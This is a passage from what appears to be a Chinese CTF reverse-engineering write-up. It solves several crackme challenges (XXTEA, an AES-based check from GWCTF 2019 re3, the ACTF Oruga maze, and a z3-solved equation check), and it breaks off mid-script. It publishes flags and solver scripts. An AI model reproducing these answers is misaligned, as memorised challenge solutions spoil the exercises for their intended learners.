class="number">7</span>]=buf[<span class="number">6</span>];</span><br><span class="line">    cipher[<span class="number">5</span>]=buf[<span class="number">7</span>];</span><br><span class="line">    cipher[<span class="number">10</span>]=buf[<span class="number">8</span>];</span><br><span class="line">    cipher[<span class="number">8</span>]=buf[<span class="number">9</span>];</span><br><span class="line">    cipher[<span class="number">11</span>]=buf[<span class="number">10</span>];</span><br><span class="line">    cipher[<span class="number">9</span>]=buf[<span class="number">11</span>];</span><br><span class="line">    cipher[<span class="number">14</span>]=buf[<span class="number">12</span>];</span><br><span class="line">    cipher[<span class="number">12</span>]=buf[<span class="number">13</span>];</span><br><span class="line">    cipher[<span class="number">15</span>]=buf[<span class="number">14</span>];</span><br><span class="line">    cipher[<span class="number">13</span>]=buf[<span class="number">15</span>];</span><br><span class="line">    cipher[<span class="number">18</span>]=buf[<span class="number">16</span>];</span><br><span class="line">    cipher[<span class="number">16</span>]=buf[<span class="number">17</span>];</span><br><span class="line">    cipher[<span class="number">19</span>]=buf[<span class="number">18</span>];</span><br><span class="line">    cipher[<span class="number">17</span>]=buf[<span class="number">19</span>];</span><br><span class="line">    cipher[<span class="number">22</span>]=buf[<span class="number">20</span>];</span><br><span class="line">    cipher[<span class="number">20</span>]=buf[<span class="number">21</span>];</span><br><span class="line">    cipher[<span class="number">23</span>]=buf[<span class="number">22</span>];</span><br><span class="line">    cipher[<span class="number">21</span>]=buf[<span class="number">23</span>];</span><br><span class="line">    <span class="comment">// printArray(&quot;cipher&quot;,cipher,0x18);</span></span><br><span class="line">    xxTeaDecrypt(cipher,<span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code class="lang-flag&#123;CXX_and_++tea&#125;```">
## [rev][GWCTF 2019]re3

1. 进入main函数，发现mprotect和SMC(自修改代码)逻辑，使用idapython进行patch

   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">st=<span class="number">0x402219</span>;</span><br><span class="line">end=st+<span class="number">223</span>;</span><br><span class="line"><span class="keyword">while</span> st&lt;=end:</span><br><span class="line">    c=Byte(st)</span><br><span class="line">    PatchByte(st,(c^<span class="number">0x99</span>))</span><br><span class="line">    st+=<span class="number">1</span></span><br></pre></td></tr></table></figure>

2. 进入sub_402219，找到比对逻辑

   0xbc 0xa 0xad 0xc0 0x14 0x7c 0x5e 0xcc 0xe0 0xb1 0x40 0xbc 0x9c 0x51 0xd5 0x2b 0x46 0xb2 0xb9 0x43 0x4d 0xe5 0x32 0x4b 0xad 0x7f 0xb4 0xb3 0x9c 0xdb 0x4b 0x5b

3. 重点在于sub_40196E

   这里用到了一个全局变量unk_603170

   1. sub_400B0A逐字节异或从0开始，共16轮

   2. 进行替换，替换表为byte_4023A0

      0x63 0x7c 0x77 0x7b 0xf2 0x6b 0x6f 0xc5 0x30 0x1 0x67 0x2b 0xfe 0xd7 0xab 0x76 0xca 0x82 0xc9 0x7d 0xfa 0x59 0x47 0xf0 0xad 0xd4 0xa2 0xaf 0x9c 0xa4 0x72 0xc0 0xb7 0xfd 0x93 0x26 0x36 0x3f 0xf7 0xcc 0x34 0xa5 0xe5 0xf1 0x71 0xd8 0x31 0x15 0x4 0xc7 0x23 0xc3 0x18 0x96 0x5 0x9a 0x7 0x12 0x80 0xe2 0xeb 0x27 0xb2 0x75 0x9 0x83 0x2c 0x1a 0x1b 0x6e 0x5a 0xa0 0x52 0x3b 0xd6 0xb3 0x29 0xe3 0x2f 0x84 0x53 0xd1 0x0 0xed 0x20 0xfc 0xb1 0x5b 0x6a 0xcb 0xbe 0x39 0x4a 0x4c 0x58 0xcf 0xd0 0xef 0xaa 0xfb 0x43 0x4d 0x33 0x85 0x45 0xf9 0x2 0x7f 0x50 0x3c 0x9f 0xa8 0x51 0xa3 0x40 0x8f 0x92 0x9d 0x38 0xf5 0xbc 0xb6 0xda 0x21 0x10 0xff 0xf3 0xd2 0xcd 0xc 0x13 0xec 0x5f 0x97 0x44 0x17 0xc4 0xa7 0x7e 0x3d 0x64 0x5d 0x19 0x73 0x60 0x81 0x4f 0xdc 0x22 0x2a 0x90 0x88 0x46 0xee 0xb8 0x14 0xde 0x5e 0xb 0xdb 0xe0 0x32 0x3a 0xa 0x49 0x6 0x24 0x5c 0xc2 0xd3 0xac 0x62 0x91 0x95 0xe4 0x79 0xe7 0xc8 0x37 0x6d 0x8d 0xd5 0x4e 0xa9 0x6c 0x56 0xf4 0xea 0x65 0x7a 0xae 0x8 0xba 0x78 0x25 0x2e 0x1c 0xa6 0xb4 0xc6 0xe8 0xdd 0x74 0x1f 0x4b 0xbd 0x8b 0x8a 0x70 0x3e 0xb5 0x66 0x48 0x3 0xf6 0xe 0x61 0x35 0x57 0xb9 0x86 0xc1 0x1d 0x9e 0xe1 0xf8 0x98 0x11 0x69 0xd9 0x8e 0x94 0x9b 0x1e 0x87 0xe9 0xce 0x55 0x28 0xdf 0x8c 0xa1 0x89 0xd 0xbf 0xe6 0x42 0x68 0x41 0x99 0x2d 0xf 0xb0 0x54 0xbb 0x16

   3. sub_400C1F进行置换 置换表

      [0, 5, 10, 15, 4, 9, 14, 3, 8, 13, 2, 7, 12, 1, 6, 11]

   4. sub_400D27自异或操作

      v1=s[i*4]

      v2=s[i*4+1]^s[i*4+2]^s[i*4+3]

      sub_400CFA 2*x^27\*(x&gt;&gt;7)

      s[i*4]=v2^sub_400CFA(s[i*4]^s[i*4+1])

      s[i*4+1]=v2^sub_400CFA(+1,+2)

      s[2]=v2^sub(+2,+3)

      s[3]=v2^sub(+3)

   5. 再进行异或

   6. 循环结束，9轮

   7. 替换

   8. 置换

   9. 异或

   看下来是AES加密算法，555我爬了

   ECB模式，密钥可以调试获得

   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0xcb</span>,<span class="number">0x8d</span>,<span class="number">0x49</span>,<span class="number">0x35</span>,<span class="number">0x21</span>,<span class="number">0xb4</span>,<span class="number">0x7a</span>,<span class="number">0x4c</span>,<span class="number">0xc1</span>,<span class="number">0xae</span>,<span class="number">0x7e</span>,<span class="number">0x62</span>,<span class="number">0x22</span>,<span class="number">0x92</span>,<span class="number">0x66</span>,<span class="number">0xce</span>]</span><br><span class="line">key = bytes(key)</span><br><span class="line">cipher = [<span class="number">0xbc</span>,<span class="number">0xa</span>,<span class="number">0xad</span>,<span class="number">0xc0</span>,<span class="number">0x14</span>,<span class="number">0x7c</span>,<span class="number">0x5e</span>,<span class="number">0xcc</span>,<span class="number">0xe0</span>,<span class="number">0xb1</span>,<span class="number">0x40</span>,<span class="number">0xbc</span>,<span class="number">0x9c</span>,<span class="number">0x51</span>,<span class="number">0xd5</span>,<span class="number">0x2b</span>,<span class="number">0x46</span>,<span class="number">0xb2</span>,<span class="number">0xb9</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0xe5</span>,<span class="number">0x32</span>,<span class="number">0x4b</span>,<span class="number">0xad</span>,<span class="number">0x7f</span>,<span class="number">0xb4</span>,<span class="number">0xb3</span>,<span class="number">0x9c</span>,<span class="number">0xdb</span>,<span class="number">0x4b</span>,<span class="number">0x5b</span>]</span><br><span class="line">cipher = bytes(cipher)</span><br><span class="line">aes = AES.new(mode=AES.MODE_ECB,key=key)</span><br><span class="line">print(aes.decrypt(cipher))</span><br></pre></td></tr></table></figure>

## [rev][ACTF新生赛2020]Oruga

迷宫问题

规则：

1. WEMJ分别代表上右下左

2. 如果上次的方向是上，这次还是上，则改为右，以此类推

3. 如果当前的位置是0，则一直沿同一方向向前走直到越界或不是0

   如果遇到非0，则停在非0单位面前

4. 最终走到0x21的位置，初始位置是0

actf&#123;MEWEMEWJMEWJM&#125;

打印迷宫函数

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x23</span>,<span class="number">0x23</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4c</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4c</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x50</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4c</span>,<span class="number">0x4c</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x50</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x4f</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x50</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x4d</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x4d</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x45</span>,<span class="number">0x45</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x30</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x45</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x45</span>,<span class="number">0x45</span>,<span class="number">0x54</span>,<span class="number">0x54</span>,<span class="number">0x54</span>,<span class="number">0x49</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x45</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x54</span>,<span class="number">0x00</span>,<span class="number">0x49</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x45</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x54</span>,<span class="number">0x00</span>,<span class="number">0x49</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x21</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x45</span>,<span class="number">0x45</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a),<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(i,i+<span class="number">16</span>):</span><br><span class="line">        print(<span class="string">&quot;%02x&quot;</span>%a[j],end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure>

## [rev]equation

自写脚本解不动了，使用大佬的正则表达式

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deEquation</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; i++) &#123;</span><br><span class="line">    str = str.replace(<span class="regexp">/l\[(\D*?)](\+l|-l|==)/g</span>, <span class="function">(<span class="params">m, a, b</span>) =&gt;</span> <span class="string">&#x27;l[&#x27;</span> + <span class="built_in">eval</span>(a) + <span class="string">&#x27;]&#x27;</span> + b);</span><br><span class="line">    &#125;</span><br><span class="line">    str = str.replace(<span class="regexp">/==(\D*?)&amp;&amp;/g</span>, <span class="function">(<span class="params">m, a</span>) =&gt;</span> <span class="string">&#x27;==&#x27;</span> + <span class="built_in">eval</span>(a) + <span class="string">&#x27;&amp;&amp;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

然后解析使用python脚本z3一跑

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">l = [Int(<span class="string">&#x27;l%d&#x27;</span>%i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x2a</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(l[<span class="number">40</span>]+l[<span class="number">35</span>]+l[<span class="number">34</span>]-l[<span class="number">0</span>]-l[<span class="number">15</span>]-l[<span class="number">37</span>]+l[<span class="number">7</span>]+l[<span class="number">6</span>]-l[<span class="number">26</span>]+l[<span class="number">20</span>]+l[<span class="number">19</span>]+l[<span class="number">8</span>]-l[<span class="number">17</span>]-l[<span class="number">14</span>]-l[<span class="number">38</span>]+l[<span class="number">1</span>]-l[<span class="number">9</span>]+l[<span class="number">22</span>]+l[<span class="number">41</span>]+l[<span class="number">3</span>]-l[<span class="number">29</span>]-l[<span class="number">36</span>]-l[<span class="number">25</span>]+l[<span class="number">5</span>]+l[<span class="number">32</span>]-l[<span class="number">16</span>]+l[<span class="number">12</span>]-l[<span class="number">24</span>]+l[<span class="number">30</span>]+l[<span class="number">39</span>]+l[<span class="number">10</span>]+l[<span class="number">2</span>]+l[<span class="number">27</span>]+l[<span class="number">28</span>]+l[<span class="number">21</span>]+l[<span class="number">33</span>]-l[<span class="number">18</span>]+l[<span class="number">4</span>]==<span class="number">861</span>)</span><br><span class="line">s.add(l[<span class="number">31</span>]+l[<span class="number">26</span>]+l[<span class="number">11</span>]-l[<span class="number">33</span>]+l[<span class="number">27</span>]-l[<span class="number">3</span>]+l[<span class="number">12</span>]+l[<span class="number">30</span>]+l[<span class="number">1</span>]+l[<span class="number">32</span>]-l[<span class="number">16</span>]+l[<span class="number">7</span>]+l[<span class="number">10</span>]-l[<span class="number">25</span>]+l[<span class="number">38</span>]-l[<span class="number">41</span>]-l[<span class="number">14</span>]-l[<span class="number">19</span>]+l[<span class="number">29</span>]+l[<span class="number">36</span>]-l[<span class="number">9</span>]-l[<span class="number">28</span>]-l[<span class="number">6</span>]-l[<span class="number">0</span>]-l[<span class="number">22</span>]-l[<span class="number">18</span>]+l[<span class="number">20</span>]-l[<span class="number">37</span>]+l[<span class="number">4</span>]-l[<span class="number">24</span>]+l[<span class="number">34</span>]-l[<span class="number">21</span>]-l[<span class="number">39</span>]-l[<span class="number">23</span>]-l[<span class="number">8</span>]-l[<span class="number">40</span>]+l[<span class="number">15</span>]-l[<span class="number">35</span>]==<span class="number">-448</span>)</span><br><span class="line">s.add(l[<span class="number">26</span>]+l[<span class="number">14</span>]+l[<span class="number">15</span>]+l[<span class="number">9</span>]+l[<span class="number">13</span>]+l[<span class="number">30</span>]-l[<span class="number">11</span>]+l[<span class="number">18</span>]+l[<span class="number">23</span>]+l[<span class="number">7</span>]+l[<span class="number">3</span>]+l[<span class="number">12</span>]+l[<span class="number">25</span>]-l[<span class="number">24</span>]-l[<span class="number">39</span>]-l[<span class="number">35</span>]-l[<span class="number">20</span>]+l[<span class="number">40</span>]-l[<span class="number">8</span>]+l[<span class="number">10</span>]-l[<span class="number">5</span>]-l[<span class="number">33</span>]-l[<span class="number">31</span>]+l[<span class="number">32</span>]+l[<span class="number">19</span>]+l[<span class="number">21</span>]-l[<span class="number">6</span>]+l[<span class="number">1</span>]+l[<span class="number">16</span>]+l[<span class="number">17</span>]+l[<span class="number">29</span>]+l[<span class="number">22</span>]-l[<span class="number">4</span>]-l[<span class="number">36</span>]+l[<span class="number">41</span>]+l[<span class="number">38</span>]+l[<span class="number">2</span>]+l[<span class="number">0</span>]==<span class="number">1244</span>)</span><br><span class="line">s.add(l[<span class="number">5</span>]+l[<span class="number">22</span>]+l[<span class="number">15</span>]+l[<span class="number">2</span>]-l[<span class="number">28</span>]-l[<span class="number">10</span>]-l[<span class="number">3</span>]-l[<span class="number">13</span>]-l[<span class="number">18</span>]+l[<span class="number">30</span>]-l[<span class="number">9</span>]+l[<span class="number">32</span>]+l[<span class="number">19</span>]+l[<span class="number">34</span>]+l[<span class="number">23</span>]-l[<span class="number">17</span>]+l[<span class="number">16</span>]-l[<span class="number">7</span>]+l[<span class="number">24</span>]-l[<span class="number">39</span>]+l[<span class="number">8</span>]-l[<span class="number">12</span>]-l[<span class="number">40</span>]-l[<span class="number">25</span>]+l[<span class="number">37</span>]-l[<span class="number">35</span>]+l[<span class="number">11</span>]-l[<span class="number">14</span>]+l[<span class="number">20</span>]-l[<span class="number">27</span>]+l[<span class="number">4</span>]-l[<span class="number">33</span>]-l[<span class="number">21</span>]+l[<span class="number">31</span>]-l[<span class="number">6</span>]+l[<span class="number">1</span>]+l[<span class="number">38</span>]-l[<span class="number">29</span>]==<span class="number">-39</span>)</span><br><span class="line">s.add(l[<span class="number">41</span>]-l[<span class="number">29</span>]+l[<span class="number">23</span>]-l[<span class="number">4</span>]+l[<span class="number">20</span>]-l[<span class="number">33</span>]+l[<span class="number">35</span>]+l[<span class="number">3</span>]-l[<span class="number">19</span>]-l[<span class="number">21</span>]+l[<span class="number">11</span>]+l[<span class="number">26</span>]-l[<span class="number">24</span>]-l[<span class="number">17</span>]+l[<span class="number">37</span>]+l[<span class="number">1</span>]+l[<span class="number">16</span>]-l[<span class="number">0</span>]-l[<span class="number">13</span>]+l[<span class="number">7</span>]+l[<span class="number">10</span>]+l[<span class="number">14</span>]+l[<span class="number">22</span>]+l[<span class="number">39</span>]-l[<span class="number">40</span>]+l[<span class="number">34</span>]-l[<span class="number">38</span>]+l[<span class="number">32</span>]+l[<span class="number">25</span>]-l[<span class="number">2</span>]+l[<span class="number">15</span>]+l[<span class="number">6</span>]+l[<span class="number">28</span>]-l[<span class="number">8</span>]-l[<span class="number">5</span>]-l[<span class="number">31</span>]-l[<span class="number">30</span>]-l[<span class="number">27</span>]==<span class="number">485</span>)</span><br><span class="line">s.add(l[<span class="number">13</span>]+l[<span class="number">19</span>]+l[<span class="number">21</span>]-l[<span class="number">2</span>]-l[<span class="number">33</span>]-l[<span class="number">0</span>]+l[<span class="number">39</span>]+l[<span class="number">31</span>]-l[<span class="number">23</span>]-l[<span class="number">41</span>]+l[<span class="number">38</span>]-l[<span class="number">29</span>]+l[<span class="number">36</span>]+l[<span class="number">24</span>]-l[<span class="number">20</span>]-l[<span class="number">9</span>]-l[<span class="number">32</span>]+l[<span class="number">37</span>]-l[<span class="number">35</span>]+l[<span class="number">40</span>]+l[<span class="number">7</span>]-l[<span class="number">26</span>]+l[<span class="number">15</span>]-l[<span class="number">10</span>]-l[<span class="number">6</span>]-l[<span class="number">16</span>]-l[<span class="number">4</span>]-l[<span class="number">5</span>]-l[<span class="number">30</span>]-l[<span class="number">14</span>]-l[<span class="number">22</span>]-l[<span class="number">25</span>]-l[<span class="number">34</span>]-l[<span class="number">17</span>]-l[<span class="number">11</span>]-l[<span class="number">27</span>]+l[<span class="number">1</span>]-l[<span class="number">28</span>]==<span class="number">-1068</span>)</span><br><span class="line">s.add(l[<span class="number">32</span>]+l[<span class="number">0</span>]+l[<span class="number">9</span>]+l[<span class="number">14</span>]+l[<span class="number">11</span>]+l[<span class="number">18</span>]-l[<span class="number">13</span>]+l[<span class="number">24</span>]-l[<span class="number">2</span>]-l[<span class="number">15</span>]+l[<span class="number">19</span>]-l[<span class="number">21</span>]+l[<span class="number">1</span>]+l[<span class="number">39</span>]-l[<span class="number">8</span>]-l[<span class="number">3</span>]+l[<span class="number">33</span>]+l[<span class="number">6</span>]-l[<span class="number">5</span>]-l[<span class="number">35</span>]-l[<span class="number">28</span>]+l[<span class="number">25</span>]-l[<span class="number">41</span>]+l[<span class="number">22</span>]-l[<span class="number">17</span>]+l[<span class="number">10</span>]+l[<span class="number">40</span>]+l[<span class="number">34</span>]+l[<span class="number">27</span>]-l[<span class="number">20</span>]+l[<span class="number">23</span>]+l[<span class="number">31</span>]-l[<span class="number">16</span>]+l[<span class="number">7</span>]+l[<span class="number">12</span>]-l[<span class="number">30</span>]+l[<span class="number">29</span>]-l[<span class="number">4</span>]==<span class="number">939</span>)</span><br><span class="line">s.add(l[<span class="number">19</span>]+l[<span class="number">11</span>]+l[<span class="number">20</span>]-l[<span class="number">16</span>]+l[<span class="number">40</span>]+l[<span class="number">25</span>]+l[<span class="number">1</span>]-l[<span class="number">31</span>]+l[<span class="number">28</span>]-l[<span class="number">23</span>]+l[<span class="number">14</span>]-l[<span class="number">9</span>]-l[<span class="number">27</span>]+l[<span class="number">35</span>]+l[<span class="number">39</span>]-l[<span class="number">37</span>]-l[<span class="number">8</span>]-l[<span class="number">22</span>]+l[<span class="number">5</span>]-l[<span class="number">6</span>]+l[<span class="number">0</span>]-l[<span class="number">32</span>]+l[<span class="number">24</span>]+l[<span class="number">33</span>]+l[<span class="number">29</span>]+l[<span class="number">38</span>]+l[<span class="number">15</span>]-l[<span class="number">2</span>]+l[<span class="number">30</span>]+l[<span class="number">7</span>]+l[<span class="number">12</span>]-l[<span class="number">3</span>]-l[<span class="number">17</span>]+l[<span class="number">34</span>]+l[<span class="number">41</span>]-l[<span class="number">4</span>]-l[<span class="number">13</span>]-l[<span class="number">26</span>]==<span class="number">413</span>)</span><br><span class="line">s.add(l[<span class="number">22</span>]+l[<span class="number">4</span>]-l[<span class="number">9</span>]+l[<span class="number">34</span>]+l[<span class="number">35</span>]+l[<span class="number">17</span>]+l[<span class="number">3</span>]-l[<span class="number">24</span>]+l[<span class="number">38</span>]-l[<span class="number">5</span>]-l[<span class="number">41</span>]-l[<span class="number">31</span>]-l[<span class="number">0</span>]-l[<span class="number">25</span>]+l[<span class="number">33</span>]+l[<span class="number">15</span>]-l[<span class="number">1</span>]-l[<span class="number">10</span>]+l[<span class="number">16</span>]-l[<span class="number">29</span>]-l[<span class="number">12</span>]+l[<span class="number">26</span>]-l[<span class="number">39</span>]-l[<span class="number">21</span>]-l[<span class="number">18</span>]-l[<span class="number">6</span>]-l[<span class="number">40</span>]-l[<span class="number">13</span>]+l[<span class="number">8</span>]+l[<span class="number">37</span>]+l[<span class="number">19</span>]+l[<span class="number">14</span>]+l[<span class="number">32</span>]+l[<span class="number">28</span>]-l[<span class="number">11</span>]+l[<span class="number">23</span>]+l[<span class="number">36</span>]+l[<span class="number">7</span>]==<span class="number">117</span>)</span><br><span class="line">s.add(l[<span class="number">32</span>]+l[<span class="number">16</span>]+l[<span class="number">3</span>]+l[<span class="number">11</span>]+l[<span class="number">34</span>]-l[<span class="number">31</span>]+l[<span class="number">14</span>]+l[<span class="number">25</span>]+l[<span class="number">1</span>]-l[<span class="number">30</span>]-l[<span class="number">33</span>]-l[<span class="number">40</span>]-l[<span class="number">4</span>]-l[<span class="number">29</span>]+l[<span class="number">18</span>]-l[<span class="number">27</span>]+l[<span class="number">13</span>]-l[<span class="number">19</span>]-l[<span class="number">12</span>]+l[<span class="number">23</span>]-l[<span class="number">39</span>]-l[<span class="number">41</span>]-l[<span class="number">8</span>]+l[<span class="number">22</span>]-l[<span class="number">5</span>]-l[<span class="number">38</span>]-l[<span class="number">9</span>]-l[<span class="number">37</span>]+l[<span class="number">17</span>]-l[<span class="number">36</span>]+l[<span class="number">24</span>]-l[<span class="number">21</span>]+l[<span class="number">2</span>]-l[<span class="number">26</span>]+l[<span class="number">20</span>]-l[<span class="number">7</span>]+l[<span class="number">35</span>]-l[<span class="number">0</span>]==<span class="number">-313</span>)</span><br><span class="line">s.add(l[<span class="number">40</span>]-l[<span class="number">1</span>]+l[<span class="number">5</span>]+l[<span class="number">7</span>]+l[<span class="number">33</span>]+l[<span class="number">29</span>]+l[<span class="number">12</span>]+l[<span class="number">38</span>]-l[<span class="number">31</span>]+l[<span class="number">2</span>]+l[<span class="number">14</span>]-l[<span class="number">35</span>]-l[<span 